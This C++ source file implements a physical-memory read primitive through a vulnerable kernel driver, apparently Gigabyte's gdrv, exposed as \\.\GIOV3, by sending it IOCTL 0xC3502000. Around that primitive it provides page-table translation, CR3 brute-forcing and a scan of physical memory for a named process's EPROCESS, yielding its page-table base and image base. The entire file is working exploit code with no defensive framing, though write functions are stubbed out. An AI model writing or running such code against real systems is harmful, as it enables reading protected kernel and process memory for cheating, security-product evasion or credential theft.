#include "gdrv_memory.h"
#include <cstring>

namespace gdrv {
    static HANDLE g_dev = INVALID_HANDLE_VALUE;
    static uint8_t* g_lowbuf = nullptr;
    static const uint32_t LOWBUF = 0x1000; // one page per map: never crosses a hole

    // 0xC3502000 : MmMapIoSpace(phys,size) + memcpy(dest32, mapped, size) + MmUnmapIoSpace
    //   in = { uint64 phys; uint32 size; uint32 dest32; }  (16 bytes)
    //   dest32 must be a pointer inside the low 4GB.
    static constexpr DWORD IOCTL_READ_PHYS = 0xC3502000;

    bool is_open() { return g_dev != INVALID_HANDLE_VALUE; }

    bool open()
    {
        if (is_open()) return true;
        g_dev = CreateFileW(L"\\\\.\\GIOV3", GENERIC_READ | GENERIC_WRITE, 0, nullptr,
                            OPEN_EXISTING, 0, nullptr);
        if (!is_open()) return false;
        if (!g_lowbuf)
            g_lowbuf = static_cast<uint8_t*>(VirtualAlloc(
                reinterpret_cast<LPVOID>(0x10000000), LOWBUF,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
        return g_lowbuf != nullptr;
    }

    void close()
    {
        if (is_open()) { CloseHandle(g_dev); g_dev = INVALID_HANDLE_VALUE; }
    }

    void* map_phys(uint64_t, uint32_t) { return nullptr; }
    bool  unmap(void*, uint32_t) { return false; }

    bool read_phys(uint64_t phys, void* buf, uint32_t size)
    {
        if (!is_open() || !g_lowbuf || !buf || !size) return false;
        uint8_t* dst = static_cast<uint8_t*>(buf);
        while (size)
        {
            uint32_t chunk = size < LOWBUF ? size : LOWBUF;
            struct { uint64_t phys; uint32_t size; uint32_t dest; } in{
                phys, chunk, static_cast<uint32_t>(reinterpret_cast<uintptr_t>(g_lowbuf)) };
            DWORD ret = 0;
            if (!DeviceIoControl(g_dev, IOCTL_READ_PHYS, &in, sizeof(in), nullptr, 0, &ret, nullptr))
                return false;
            std::memcpy(dst, g_lowbuf, chunk);
            phys += chunk; dst += chunk; size -= chunk;
        }
        return true;
    }

    bool write_phys(uint64_t, const void*, uint32_t) { return false; } // read-only

    static bool read_u64(uint64_t phys, uint64_t* v) { return read_phys(phys, v, 8); }

    static bool translate(uint64_t cr3, uint64_t va, uint64_t* pa)
    {
        uint64_t e;
        if (!read_u64(cr3 + 8 * ((va >> 39) & 0x1FF), &e) || !(e & 1)) return false;
        if (!read_u64((e & 0x000FFFFFFFFFF000ULL) + 8 * ((va >> 30) & 0x1FF), &e) || !(e & 1)) return false;
        if (e & 0x80) { *pa = (e & 0x000FFFFFFFE00000ULL) + (va & 0x1FFFFFULL); return true; }
        if (!read_u64((e & 0x000FFFFFFFFFF000ULL) + 8 * ((va >> 21) & 0x1FF), &e) || !(e & 1)) return false;
        if (e & 0x80) { *pa = (e & 0x000FFFFFFFE00000ULL) + (va & 0x1FFFFFULL); return true; }
        if (!read_u64((e & 0x000FFFFFFFFFF000ULL) + 8 * ((va >> 12) & 0x1FF), &e) || !(e & 1)) return false;
        *pa = (e & 0x000FFFFFFFFFF000ULL) + (va & 0xFFFULL);
        return true;
    }

    bool read_virt(uint64_t cr3, uint64_t va, void* buf, uint32_t size)
    {
        uint8_t* dst = static_cast<uint8_t*>(buf);
        uint64_t cur = va; uint32_t left = size;
        while (left)
        {
            uint64_t pa = 0;
            if (!translate(cr3, cur, &pa)) return false;
            uint32_t page_off = static_cast<uint32_t>(cur & 0xFFF);
            uint32_t chunk = 0x1000 - page_off;
            if (chunk > left) chunk = left;
            if (!read_phys(pa, dst, chunk)) return false;
            cur += chunk; dst += chunk; left -= chunk;
        }
        return true;
    }

    bool write_virt(uint64_t, uint64_t, const void*, uint32_t) { return false; } // read-only

    uint64_t find_cr3(uint64_t image_base, uint64_t max_phys)
    {
        for (uint64_t cand = 0x1000; cand < max_phys; cand += 0x1000)
        {
            uint64_t pa = 0;
            if (!translate(cand, image_base, &pa)) continue;
            uint16_t mz = 0;
            if (!read_phys(pa, &mz, 2)) continue;
            if (mz == 0x5A4D) return cand;
        }
        return 0;
    }

    uint64_t find_eprocess(const char* name15, uint64_t max_phys,
                           uint64_t* out_cr3, uint64_t* out_base)
    {
        static uint8_t buf[LOWBUF];
        // start at 1MB to skip the VGA/BIOS hole at 0xA0000-0x100000
        for (uint64_t pa = 0x100000; pa < max_phys; pa += LOWBUF)
        {
            uint32_t span = (max_phys - pa < LOWBUF) ? static_cast<uint32_t>(max_phys - pa) : LOWBUF;
            if (!read_phys(pa, buf, span)) continue;
            for (uint32_t i = 0; i + 15 <= span; ++i)
            {
                if (std::memcmp(buf + i, name15, 15) != 0) continue;
                uint64_t fphys = pa + i;
                for (uint32_t off = 0x400; off <= 0x900; off += 8)
                {
                    if (fphys < off) continue;
                    uint64_t ep = fphys - off;
                    uint64_t cr3 = 0;
                    if (!read_phys(ep + 0x28, &cr3, 8)) continue;   // DirectoryTableBase
                    if (!cr3 || (cr3 & 0xFFF) || cr3 >= max_phys) continue;
                    uint64_t e0 = 0;
                    if (!read_phys(cr3, &e0, 8)) continue;
                    if (!(e0 & 1)) continue;
                    uint64_t base = 0;
                    read_phys(ep + 0x520, &base, 8);                // SectionBaseAddress
                    if (out_cr3) *out_cr3 = cr3;
                    if (out_base) *out_base = base;
                    return ep;
                }
            }
        }
        return 0;
    }
}
